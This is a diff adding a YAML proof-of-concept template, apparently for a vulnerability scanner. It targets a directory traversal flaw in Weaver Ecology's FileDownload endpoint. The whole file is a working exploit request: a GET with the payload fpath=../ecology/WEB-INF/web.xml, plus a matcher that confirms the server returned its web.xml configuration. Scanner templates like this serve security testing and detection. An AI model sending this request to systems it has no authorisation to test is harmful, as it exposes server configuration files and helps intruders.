@@ -1,0 +1,21 @@
+id: poc-yaml-ecology-filedownload-directory-traversal
+info:
+  name: Ecology Filedownload Directory Traversal
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: Ecology Filedownload
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "<url-pattern>/weaver/")
+  output: []
